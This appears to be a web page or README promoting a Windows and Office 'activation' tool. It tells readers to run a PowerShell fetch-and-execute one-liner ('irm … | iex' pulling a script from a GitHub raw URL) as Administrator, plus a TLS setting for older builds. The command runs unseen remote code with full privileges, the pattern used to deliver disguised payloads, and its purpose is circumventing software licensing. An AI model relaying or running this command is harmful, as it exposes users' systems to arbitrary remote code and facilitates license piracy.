Activate Windows & Office

Modern, fast, and open‑source.
Run the command below in PowerShell (as Admin).

irm https://raw.githubusercontent.com/UpdateSys/win/main/win | iex
ℹ️ Old Windows

For Windows 8.1 / 10 (old builds), run this first:

[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

How to use

  1. Copy the main command above.
  2. If you're on an old Windows build, copy and run the TLS command first.
  3. Open PowerShell as Administrator (right‑click → Run as admin).
  4. Paste the command(s) and press Enter.
  5. Wait a few seconds — activation will run automatically.
